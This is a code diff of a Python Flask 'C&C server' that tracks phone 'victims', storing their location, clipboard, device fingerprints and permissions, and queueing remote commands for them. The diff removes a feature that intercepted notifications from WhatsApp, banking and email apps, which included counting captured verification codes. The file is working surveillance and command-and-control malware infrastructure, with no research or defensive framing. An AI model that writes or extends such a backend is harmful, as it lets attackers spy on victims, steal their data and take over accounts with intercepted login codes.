@@ -1,4 +1,4 @@
-
+#!/usr/bin/env python3
 """
 Advanced Mobile Security C&C Server with Full Dashboard Features
 Complete victim management, data analysis, and real-time monitoring
@@ -71,24 +71,6 @@ def init_db():
             )
         ''')
         
-        # Notifications table for intercepted notifications
-        cursor.execute('''
-            CREATE TABLE notifications (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                victim_id TEXT,
-                platform TEXT,
-                category TEXT,
-                title TEXT,
-                body TEXT,
-                notification_data TEXT,
-                analysis_data TEXT,
-                risk_level TEXT DEFAULT 'low',
-                sensitive_data TEXT,
-                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                source TEXT DEFAULT 'interceptor'
-            )
-        ''')
-        
         # Commands table for remote control
         cursor.execute('''
             CREATE TABLE commands (
@@ -130,7 +112,7 @@ def log_activity(message, ip_address="server"):
     print(f"[{timestamp}] 📡 {message} | IP: {ip_address}")
 
 def store_victim_data(victim_id, data_type, content, source_url, ip_address, user_agent, attack_type='unknown'):
-    """Enhanced victim data storage with notification support"""
+    """Enhanced victim data storage with metadata"""
     try:
         conn = sqlite3.connect(DATABASE)
         cursor = conn.cursor()
@@ -161,10 +143,6 @@ def store_victim_data(victim_id, data_type, content, source_url, ip_address, use
             # Track permissions
             if 'permission' in content:
                 permissions_granted.append(content.get('permission'))
-            
-            # Handle notification interception
-            if data_type == 'notification_intercepted':
-                store_notification_data(victim_id, content)
         
         # Update or insert victim info with enhanced data
         cursor.execute('''
@@ -177,7 +155,7 @@ def store_victim_data(victim_id, data_type, content, source_url, ip_address, use
         
         # Determine severity based on data type
         severity = 'low'
-        if data_type in ['location_data', 'clipboard_data', 'device_fingerprint', 'notification_intercepted']:
+        if data_type in ['location_data', 'clipboard_data', 'device_fingerprint']:
             severity = 'high'
         elif data_type in ['permission_granted', 'background_monitor']:
             severity = 'medium'
@@ -199,41 +177,6 @@ def store_victim_data(victim_id, data_type, content, source_url, ip_address, use
     except Exception as e:
         log_activity(f"❌ Database error in store_victim_data: {e}", ip_address)
         traceback.print_exc()
-        return False
-
-def store_notification_data(victim_id, notification_content):
-    """Store intercepted notification data in dedicated table"""
-    try:
-        conn = sqlite3.connect(DATABASE)
-        cursor = conn.cursor()
-        
-        # Extract notification details
-        notification = notification_content.get('notification', {})
-        analysis = notification_content.get('analysis', {})
-        
-        platform = analysis.get('platform', 'unknown')
-        category = analysis.get('category', 'unknown')
-        title = notification.get('title', '')
-        body = notification.get('body', '')
-        risk_level = analysis.get('riskLevel', 'low')
-        sensitive_data = json.dumps(analysis.get('sensitiveData', []))
-        
-        cursor.execute('''
-            INSERT INTO notifications 
-            (victim_id, platform, category, title, body, notification_data, 
-             analysis_data, risk_level, sensitive_data)
-            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
-        ''', (victim_id, platform, category, title, body, 
-              json.dumps(notification), json.dumps(analysis), risk_level, sensitive_data))
-        
-        conn.commit()
-        conn.close()
-        
-        log_activity(f"📱 Stored notification from {platform} for victim {victim_id[:12]}...")
-        return True
-        
-    except Exception as e:
-        log_activity(f"❌ Error storing notification: {e}")
         return False
 
 @app.route('/')
@@ -540,7 +483,6 @@ def dashboard():
         <a href="#" class="nav-item" onclick="showSection('map')">🗺️ Geolocation</a>
         <a href="#" class="nav-item" onclick="showSection('timeline')">⏰ Timeline</a>
         <a href="#" class="nav-item" onclick="showSection('commands')">⚡ Commands</a>
-        <a href="#" class="nav-item" onclick="showSection('notifications')">📱 Notifications</a>
         <a href="#" class="nav-item" onclick="showSection('export')">💾 Export Data</a>
         <a href="#" class="nav-item" onclick="showSection('settings')">⚙️ Settings</a>
         
@@ -727,93 +669,6 @@ def dashboard():
             </div>
         </div>
 
-        <!-- Notifications Section -->
-        <div id="notifications-section" class="content-section">
-            <h2>📱 Notification Interceptor</h2>
-            
-            <div class="filter-controls">
-                <select class="search-filter" id="notification-platform-filter" onchange="filterNotifications()">
-                    <option value="">All Platforms</option>
-                    <option value="whatsapp">WhatsApp</option>
-                    <option value="telegram">Telegram</option>
-                    <option value="facebook">Facebook</option>
-                    <option value="instagram">Instagram</option>
-                    <option value="gmail">Gmail</option>
-                    <option value="banking">Banking</option>
-                    <option value="unknown">Unknown</option>
-                </select>
-                <select class="search-filter" id="notification-category-filter" onchange="filterNotifications()">
-                    <option value="">All Categories</option>
-                    <option value="messaging">Messaging</option>
-                    <option value="financial">Financial</option>
-                    <option value="security">Security</option>
-                    <option value="social">Social</option>
-                    <option value="email">Email</option>
-                </select>
-                <select class="search-filter" id="notification-risk-filter" onchange="filterNotifications()">
-                    <option value="">All Risk Levels</option>
-                    <option value="high">High Risk</option>
-                    <option value="medium">Medium Risk</option>
-                    <option value="low">Low Risk</option>
-                </select>
-                <button onclick="exportNotifications()">📥 Export Notifications</button>
-                <button onclick="testNotificationCapture()">🧪 Test Capture</button>
-            </div>
-            
-            <!-- Notification Statistics -->
-            <div class="stats" style="margin: 20px 0;">
-                <div class="stat-box">
-                    <div class="stat-number" id="total-notifications">0</div>
-                    <div class="stat-label">Total Intercepted</div>
-                </div>
-                <div class="stat-box">
-                    <div class="stat-number" id="whatsapp-notifications">0</div>
-                    <div class="stat-label">WhatsApp</div>
-                </div>
-                <div class="stat-box">
-                    <div class="stat-number" id="sensitive-notifications">0</div>
-                    <div class="stat-label">Sensitive Data</div>
-                </div>
-                <div class="stat-box">
-                    <div class="stat-number" id="verification-codes">0</div>
-                    <div class="stat-label">Verification Codes</div>
-                </div>
-            </div>
-            
-            <!-- Live Notification Feed -->
-            <div style="background: rgba(0, 0, 0, 0.8); border: 2px solid #00ff41; border-radius: 15px; padding: 20px; margin: 20px 0;">
-                <h3>🔴 Live Notification Feed</h3>
-                <div id="live-notification-feed" style="max-height: 300px; overflow-y: auto; margin-top: 15px;">
-                    <div style="text-align: center; padding: 40px; color: #666;">
-                        📡 Waiting for notifications...
-                    </div>
-                </div>
-            </div>
-            
-            <!-- Intercepted Notifications Table -->
-            <div id="notifications-table-container">
-                <h3>📋 Intercepted Notifications</h3>
-                <table class="victims-table">
-                    <thead>
-                        <tr>
-                            <th>⏰ Time</th>
-                            <th>📱 Platform</th>
-                            <th>📋 Category</th>
-                            <th>📝 Content Preview</th>
-                            <th>⚠️ Risk Level</th>
-                            <th>🔍 Sensitive Data</th>
-                            <th>🛠️ Actions</th>
-                        </tr>
-                    </thead>
-                    <tbody id="notifications-tbody">
-                        <tr><td colspan="7" style="text-align: center; color: #666; padding: 40px;">
-                            📱 No notifications intercepted yet
-                        </td></tr>
-                    </tbody>
-                </table>
-            </div>
-        </div>
-
         <!-- Export Section -->
         <div id="export-section" class="content-section">
             <h2>💾 Data Export & Reports</h2>
@@ -937,9 +792,6 @@ def dashboard():
                     break;
                 case 'commands':
                     loadCommandsData();
-                    break;
-                case 'notifications':
-                    loadNotificationsData();
                     break;
                 case 'export':
                     generateAnalytics();
@@ -1450,30 +1302,6 @@ def api_dashboard_data():
                 'tags': row[7]
             })
         
-        # Get recent notifications
-        cursor.execute('''
-            SELECT id, victim_id, platform, category, title, body, 
-                   notification_data, analysis_data, risk_level, timestamp
-            FROM notifications 
-            ORDER BY timestamp DESC 
-            LIMIT 100
-        ''')
-        
-        notifications = []
-        for row in cursor.fetchall():
-            notifications.append({
-                'id': row[0],
-                'victim_id': row[1],
-                'platform': row[2],
-                'category': row[3],
-                'title': row[4],
-                'body': row[5],
-                'notification': json.loads(row[6]) if row[6] else {},
-                'analysis': json.loads(row[7]) if row[7] else {},
-                'risk_level': row[8],
-                'timestamp': row[9]
-            })
-        
         conn.close()
         
         return jsonify({
@@ -1485,8 +1313,7 @@ def api_dashboard_data():
                 'attack_types': attack_types
             },
             'victims': victims,
-            'dataPoints': data_points,
-            'notifications': notifications
+            'dataPoints': data_points
         })
         
     except Exception as e:
@@ -1646,297 +1473,6 @@ def api_export(export_type):
         log_activity(f"❌ Error in api_export: {e}")
         return jsonify({'error': str(e)}), 500
 
-@app.route('/api/test-notification-capture', methods=['POST'])
-def api_test_notification_capture():
-    """Test notification capture functionality"""
-    try:
-        data = request.get_json()
-        victim_id = data.get('victim_id', 'test_notification_' + str(int(time.time())))
-        
-        # Create test notifications
-        test_notifications = [
-            {
-                'type': 'notification_intercepted',
-                'notification': {
-                    'title': 'WhatsApp',
-                    'body': 'John: Your verification code is 123456',
-                    'icon': '/whatsapp-icon.png'
-                },
-                'analysis': {
-                    'platform': 'whatsapp',
-                    'category': 'messaging',
-                    'riskLevel': 'high',
-                    'sensitiveData': [
-                        {'type': 'verification_code', 'value': '123456'}
-                    ]
-                },
-                'victim_id': victim_id,
-                'timestamp': time.time() * 1000
-            },
-            {
-                'type': 'notification_intercepted',
-                'notification': {
-                    'title': 'Bank of America',
-                    'body': 'Security Alert: Login from new device',
-                    'icon': '/bank-icon.png'
-                },
-                'analysis': {
-                    'platform': 'banking',
-                    'category': 'financial',
-                    'riskLevel': 'high',
-                    'sensitiveData': []
-                },
-                'victim_id': victim_id,
-                'timestamp': time.time() * 1000 + 1000
-            },
-            {
-                'type': 'notification_intercepted',
-                'notification': {
-                    'title': 'Instagram',
-                    'body': 'sarah_jones liked your photo',
-                    'icon': '/instagram-icon.png'
-                },
-                'analysis': {
-                    'platform': 'instagram',
-                    'category': 'social',
-                    'riskLevel': 'low',
-                    'sensitiveData': []
-                },
-                'victim_id': victim_id,
-                'timestamp': time.time() * 1000 + 2000
-            }
-        ]
-        
-        # Store test notifications
-        for notification in test_notifications:
-            store_victim_data(
-                victim_id, 
-                'notification_intercepted', 
-                notification, 
-                'test_notification_capture', 
-                request.remote_addr, 
-                'Test Agent', 
-                'notification_test'
-            )
-        
-        log_activity(f"🧪 Test notification capture executed for {victim_id}")
-        
-        return jsonify({
-            'status': 'success',
-            'message': 'Test notifications generated',
-            'victim_id': victim_id,
-            'notifications_created': len(test_notifications)
-        })
-        
-    except Exception as e:
-        log_activity(f"❌ Error in test notification capture: {e}")
-        return jsonify({'error': str(e)}), 500
-
-@app.route('/api/notification/<int:notification_id>/details')
-def api_notification_details(notification_id):
-    """Get detailed notification information"""
-    try:
-        conn = sqlite3.connect(DATABASE)
-        cursor = conn.cursor()
-        
-        cursor.execute('''
-            SELECT * FROM notifications WHERE id = ?
-        ''', (notification_id,))
-        
-        notification_row = cursor.fetchone()
-        
-        if not notification_row:
-            return jsonify({'error': 'Notification not found'}), 404
-        
-        conn.close()
-        
-        # Format notification data
-        notification = {
-            'id': notification_row[0],
-            'victim_id': notification_row[1],
-            'platform': notification_row[2],
-            'category': notification_row[3],
-            'title': notification_row[4],
-            'body': notification_row[5],
-            'notification': json.loads(notification_row[6]) if notification_row[6] else {},
-            'analysis': json.loads(notification_row[7]) if notification_row[7] else {},
-            'risk_level': notification_row[8],
-            'sensitive_data': json.loads(notification_row[9]) if notification_row[9] else [],
-            'timestamp': notification_row[10]
-        }
-        
-        return jsonify(notification)
-        
-    except Exception as e:
-        log_activity(f"❌ Error in api_notification_details: {e}")
-        return jsonify({'error': str(e)}), 500
-    
-
-@app.route('/api/force-init-db', methods=['POST'])
-def api_force_init_db():
-    """Force database initialization"""
-    try:
-        log_activity("🔧 Force initializing database...")
-        
-        # Try to connect and drop all tables
-        conn = sqlite3.connect(DATABASE)
-        cursor = conn.cursor()
-        
-        # Get all table names
-        cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
-        tables = cursor.fetchall()
-        
-        # Drop all existing tables
-        for table in tables:
-            try:
-                cursor.execute(f'DROP TABLE IF EXISTS {table[0]}')
-                log_activity(f"🗑️ Dropped table: {table[0]}")
-            except Exception as e:
-                log_activity(f"⚠️ Error dropping {table[0]}: {e}")
-        
-        conn.commit()
-        conn.close()
-        
-        # Now recreate with init_db
-        success = init_db()
-        
-        if success:
-            # Verify tables were created
-            conn = sqlite3.connect(DATABASE)
-            cursor = conn.cursor()
-            cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
-            new_tables = [table[0] for table in cursor.fetchall()]
-            conn.close()
-            
-            log_activity(f"✅ Database recreated with tables: {new_tables}")
-            
-            return jsonify({
-                'status': 'success', 
-                'message': 'Database force initialized',
-                'tables_created': new_tables
-            })
-        else:
-            return jsonify({'status': 'error', 'message': 'Database initialization failed'}), 500
-            
-    except Exception as e:
-        log_activity(f"❌ Error in force init: {e}")
-        traceback.print_exc()
-        return jsonify({'error': str(e)}), 500
-
-@app.route('/api/manual-create-tables', methods=['POST'])
-def api_manual_create_tables():
-    """Manually create all required tables"""
-    try:
-        conn = sqlite3.connect(DATABASE)
-        cursor = conn.cursor()
-        
-        log_activity("🔧 Manually creating tables...")
-        
-        # Create victims table
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS victims (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                victim_id TEXT UNIQUE,
-                session_id TEXT,
-                first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                user_agent TEXT,
-                ip_address TEXT,
-                attack_type TEXT,
-                status TEXT DEFAULT 'active',
-                location_lat REAL,
-                location_lng REAL,
-                device_info TEXT,
-                permissions_granted TEXT,
-                notes TEXT
-            )
-        ''')
-        log_activity("✅ Created victims table")
-        
-        # Create collected_data table  
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS collected_data (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                victim_id TEXT,
-                data_type TEXT,
-                data_content TEXT,
-                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                source_url TEXT,
-                severity TEXT DEFAULT 'medium',
-                tags TEXT
-            )
-        ''')
-        log_activity("✅ Created collected_data table")
-        
-        # Create notifications table
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS notifications (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                victim_id TEXT,
-                platform TEXT,
-                category TEXT,
-                title TEXT,
-                body TEXT,
-                notification_data TEXT,
-                analysis_data TEXT,
-                risk_level TEXT DEFAULT 'low',
-                sensitive_data TEXT,
-                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                source TEXT DEFAULT 'interceptor'
-            )
-        ''')
-        log_activity("✅ Created notifications table")
-        
-        # Create commands table
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS commands (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                victim_id TEXT,
-                command_type TEXT,
-                command_data TEXT,
-                status TEXT DEFAULT 'pending',
-                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                executed_at TIMESTAMP
-            )
-        ''')
-        log_activity("✅ Created commands table")
-        
-        # Create sessions table
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS sessions (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                victim_id TEXT,
-                session_start TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                session_end TIMESTAMP,
-                duration INTEGER,
-                page_views INTEGER DEFAULT 0,
-                actions_performed INTEGER DEFAULT 0
-            )
-        ''')
-        log_activity("✅ Created sessions table")
-        
-        conn.commit()
-        
-        # Verify all tables exist
-        cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
-        tables = [table[0] for table in cursor.fetchall()]
-        
-        conn.close()
-        
-        log_activity(f"✅ All tables created: {tables}")
-        
-        return jsonify({
-            'status': 'success',
-            'message': 'All tables created manually',
-            'tables': tables
-        })
-        
-    except Exception as e:
-        log_activity(f"❌ Error creating tables manually: {e}")
-        traceback.print_exc()
-        return jsonify({'error': str(e)}), 500
-    
-
 @app.route('/api/clear-data', methods=['POST'])
 def api_clear_data():
     """Clear all data from database"""
@@ -1948,7 +1484,6 @@ def api_clear_data():
         cursor.execute('DELETE FROM victims')
         cursor.execute('DELETE FROM commands')
         cursor.execute('DELETE FROM sessions')
-        cursor.execute('DELETE FROM notifications')
         
         conn.commit()
         conn.close()
@@ -1961,6 +1496,7 @@ def api_clear_data():
         log_activity(f"❌ Error in api_clear_data: {e}")
         return jsonify({'error': str(e)}), 500
 
+# Keep all the existing endpoints from the previous version
 @app.route('/collect', methods=['POST', 'OPTIONS'])
 def collect_data():
     """Main data collection endpoint with better error handling"""
